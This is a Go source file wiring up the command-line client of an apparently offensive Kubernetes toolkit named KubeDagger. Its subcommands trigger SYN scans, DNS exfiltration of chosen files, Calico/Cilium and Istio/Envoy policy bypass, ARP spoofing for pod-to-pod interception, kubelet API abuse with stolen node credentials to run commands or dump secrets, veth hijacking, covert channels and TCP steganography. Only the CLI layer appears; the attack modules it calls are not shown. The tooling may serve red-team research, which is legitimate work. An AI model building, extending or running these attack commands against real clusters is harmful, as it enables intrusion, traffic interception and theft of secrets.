package run

import (
	"fmt"
	"regexp"

	"github.com/spf13/cobra"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/arp_spoof"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/covert_chan"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/dns_exfil"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/kubelet_abuse"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/meshbypass"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/netbypass"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/network_discovery"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/tcp_stego"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/veth_hijack"
)

var cmdGetNetworkDiscovery = &cobra.Command{
	Use:   "get",
	Short: "get network discovery data",
	Long:  "get returns the list of data collected by the network discovery feature on the target system",
	RunE:  getNetworkDiscoveryCmd,
}

var cmdGetNetworkDiscoveryScan = &cobra.Command{
	Use:   "scan",
	Short: "scan the network of the target system",
	Long:  "scan triggers a network SYN scan on the target system with the provided parameters",
	RunE:  getNetworkDiscoveryScanCmd,
}

var cmdDNSExfil = &cobra.Command{
	Use:   "dns_exfil",
	Short: "DNS-based data exfiltration",
	Long:  "dns_exfil encodes file data in DNS queries to exfiltrate through restricted networks",
	RunE:  dnsExfilCmd,
}

var cmdNetBypass = &cobra.Command{
	Use:   "netbypass",
	Short: "network policy bypass",
	Long:  "netbypass uses XDP-level packet manipulation to bypass Calico/Cilium network policies",
	RunE:  netBypassCmd,
}

var cmdMeshBypass = &cobra.Command{
	Use:   "meshbypass",
	Short: "service mesh bypass",
	Long:  "meshbypass uses XDP-level techniques to bypass Istio/Envoy sidecar proxies",
	RunE:  meshBypassCmd,
}

var cmdARPSpoof = &cobra.Command{
	Use:   "arp-spoof",
	Short: "ARP cache poisoning",
	Long:  "arp-spoof injects gratuitous ARP replies via XDP to MITM pod-to-pod traffic",
	RunE:  arpSpoofCmd,
}

var cmdKubeletAbuse = &cobra.Command{
	Use:   "kubelet",
	Short: "Kubelet API abuse",
	Long:  "kubelet connects to the kubelet API (10250) with stolen node creds to exec in pods or dump secrets",
	RunE:  kubeletAbuseCmd,
}

var cmdVethHijack = &cobra.Command{
	Use:   "veth-hijack",
	Short: "Veth pair hijacking",
	Long:  "veth-hijack attaches TC BPF to veth pairs for transparent pod-to-pod traffic interception",
	RunE:  vethHijackCmd,
}

var cmdCovertChan = &cobra.Command{
	Use:   "covert-channel",
	Short: "Covert channels",
	Long:  "covert-channel uses ICMP payload, IPv4 ID field, TCP urgent pointer, or TTL encoding for stealth comms",
	RunE:  covertChanCmd,
}

var cmdTCPStego = &cobra.Command{
	Use:   "tcp-stego",
	Short: "TCP window steganography",
	Long:  "tcp-stego encodes covert data in TCP window size field via TC egress BPF",
	RunE:  tcpStegoCmd,
}

var ipv4Regex = `^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4})`

func getNetworkDiscoveryCmd(cmd *cobra.Command, args []string) error {
	return network_discovery.SendGetNetworkDiscoveryRequest(options.Target, options.ActiveDiscovery, options.PassiveDiscovery)
}

func getNetworkDiscoveryScanCmd(cmd *cobra.Command, args []string) error {
	if len(options.Range) == 0 || len(options.Range) >= 6 {
		return fmt.Errorf("invalid 'range' value: %s (has ton be above 0 and below 100k)", options.Range)
	}
	match, _ := regexp.MatchString(ipv4Regex, options.IP)
	if !match {
		return fmt.Errorf("invalid 'IP' format (expected X.X.X.X): %s", options.IP)
	}
	if len(options.Port) == 0 || len(options.Port) >= 6 {
		return fmt.Errorf("invlid 'Port' value: %s", options.Port)
	}
	return network_discovery.SendNetworkDiscoveryScanRequest(options.Target, options.IP, options.Port, options.Range)
}

func dnsExfilCmd(cmd *cobra.Command, args []string) error {
	if options.ExfilFile == "" {
		return fmt.Errorf("--file is required")
	}
	if options.ExfilDomain == "" {
		return fmt.Errorf("--domain is required")
	}
	return dns_exfil.Exfiltrate(options.ExfilFile, options.ExfilDomain, options.DNSServer)
}

func netBypassCmd(cmd *cobra.Command, args []string) error {
	return netbypass.Execute(options.Target, options.BypassMode, options.DestIP, options.DestPort, options.Output)
}

func meshBypassCmd(cmd *cobra.Command, args []string) error {
	return meshbypass.Execute(options.Target, options.MeshBypassMode, options.MeshTarget, options.Output)
}

func arpSpoofCmd(cmd *cobra.Command, args []string) error {
	return arp_spoof.Execute(options.Target, options.ARPVictimIP, options.ARPGatewayIP, options.ARPInterface, options.Output)
}

func kubeletAbuseCmd(cmd *cobra.Command, args []string) error {
	return kubelet_abuse.Execute(options.Target, options.KubeletAction, options.KubeletNode, options.KubeletPod, options.KubeletCommand, options.Output)
}

func vethHijackCmd(cmd *cobra.Command, args []string) error {
	return veth_hijack.Execute(options.Target, options.VethSourcePod, options.VethDestPod, options.VethMode, options.Output)
}

func covertChanCmd(cmd *cobra.Command, args []string) error {
	return covert_chan.Execute(options.Target, options.CovertChanType, options.CovertChanDest, options.CovertChanData, options.Output)
}

func tcpStegoCmd(cmd *cobra.Command, args []string) error {
	return tcp_stego.Execute(options.Target, options.TCPStegoData, options.TCPStegoDest, options.TCPStegoBPP, options.Output)
}

func init() {
	cmdGetNetworkDiscovery.PersistentFlags().BoolVar(
		&options.ActiveDiscovery,
		"active",
		false,
		"defines if flows discovered by the active scan should be shown")
	cmdGetNetworkDiscovery.PersistentFlags().BoolVar(
		&options.PassiveDiscovery,
		"passive",
		false,
		"defines if flows discovered by the passive scan should be shown")
	cmdGetNetworkDiscoveryScan.PersistentFlags().StringVar(
		&options.IP,
		"ip",
		"",
		"defines the starting IP address of the network scan")
	cmdGetNetworkDiscoveryScan.PersistentFlags().StringVar(
		&options.Port,
		"port",
		"",
		"defines the starting port of the network scan")
	cmdGetNetworkDiscoveryScan.PersistentFlags().StringVar(
		&options.Range,
		"range",
		"20",
		"defines the number of ports to scan, starting at the port defined by 'port'")

	cmdNetworkDiscoveryProg.AddCommand(cmdGetNetworkDiscovery)
	cmdNetworkDiscoveryProg.AddCommand(cmdGetNetworkDiscoveryScan)
	KUBEDaggerClient.AddCommand(cmdNetworkDiscoveryProg)

	cmdDNSExfil.PersistentFlags().StringVar(
		&options.ExfilFile,
		"file",
		"",
		"path to the file to exfiltrate")
	cmdDNSExfil.PersistentFlags().StringVar(
		&options.ExfilDomain,
		"domain",
		"",
		"domain to use for DNS exfiltration")
	cmdDNSExfil.PersistentFlags().StringVar(
		&options.DNSServer,
		"server",
		"8.8.8.8",
		"DNS server to send queries to")
	KUBEDaggerClient.AddCommand(cmdDNSExfil)

	cmdNetBypass.PersistentFlags().StringVar(
		&options.BypassMode,
		"mode",
		"direct",
		"bypass mode: direct, encap, or rewrite")
	cmdNetBypass.PersistentFlags().StringVar(
		&options.DestIP,
		"dest-ip",
		"",
		"destination IP to reach")
	cmdNetBypass.PersistentFlags().StringVar(
		&options.DestPort,
		"dest-port",
		"",
		"destination port to reach")
	cmdNetBypass.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdNetBypass)

	cmdMeshBypass.PersistentFlags().StringVar(
		&options.MeshBypassMode,
		"mode",
		"skip-proxy",
		"bypass mode: skip-proxy, spoof-identity, or raw-connect")
	cmdMeshBypass.PersistentFlags().StringVar(
		&options.MeshTarget,
		"mesh-target",
		"",
		"target service to reach bypassing the mesh")
	cmdMeshBypass.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdMeshBypass)

	cmdARPSpoof.PersistentFlags().StringVar(
		&options.ARPVictimIP,
		"victim-ip",
		"",
		"victim pod IP to poison")
	cmdARPSpoof.PersistentFlags().StringVar(
		&options.ARPGatewayIP,
		"gateway-ip",
		"",
		"gateway IP to impersonate")
	cmdARPSpoof.PersistentFlags().StringVar(
		&options.ARPInterface,
		"interface",
		"eth0",
		"network interface for ARP injection")
	cmdARPSpoof.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdARPSpoof)

	cmdKubeletAbuse.PersistentFlags().StringVar(
		&options.KubeletAction,
		"action",
		"list",
		"kubelet action: exec, list, or secrets")
	cmdKubeletAbuse.PersistentFlags().StringVar(
		&options.KubeletNode,
		"node",
		"",
		"target node IP (kubelet port 10250)")
	cmdKubeletAbuse.PersistentFlags().StringVar(
		&options.KubeletPod,
		"pod",
		"",
		"target pod name for exec action")
	cmdKubeletAbuse.PersistentFlags().StringVar(
		&options.KubeletCommand,
		"cmd",
		"id",
		"command to execute in pod")
	cmdKubeletAbuse.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdKubeletAbuse)

	cmdVethHijack.PersistentFlags().StringVar(
		&options.VethSourcePod,
		"source-pod",
		"",
		"source pod whose veth to attach to")
	cmdVethHijack.PersistentFlags().StringVar(
		&options.VethDestPod,
		"dest-pod",
		"",
		"destination pod for traffic interception")
	cmdVethHijack.PersistentFlags().StringVar(
		&options.VethMode,
		"mode",
		"mirror",
		"hijack mode: mirror, redirect, or inject")
	cmdVethHijack.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdVethHijack)

	cmdCovertChan.PersistentFlags().StringVar(
		&options.CovertChanType,
		"type",
		"icmp",
		"channel type: icmp, ipid, urgent, or ttl")
	cmdCovertChan.PersistentFlags().StringVar(
		&options.CovertChanDest,
		"dest",
		"",
		"destination IP for covert channel")
	cmdCovertChan.PersistentFlags().StringVar(
		&options.CovertChanData,
		"data",
		"",
		"data payload to transmit")
	cmdCovertChan.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdCovertChan)

	cmdTCPStego.PersistentFlags().StringVar(
		&options.TCPStegoData,
		"data",
		"",
		"data to encode in TCP window size field")
	cmdTCPStego.PersistentFlags().StringVar(
		&options.TCPStegoDest,
		"dest",
		"",
		"destination ip:port for steganographic transmission")
	cmdTCPStego.PersistentFlags().StringVar(
		&options.TCPStegoBPP,
		"bits-per-packet",
		"2",
		"bits encoded per packet: 2 or 4")
	cmdTCPStego.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdTCPStego)
}
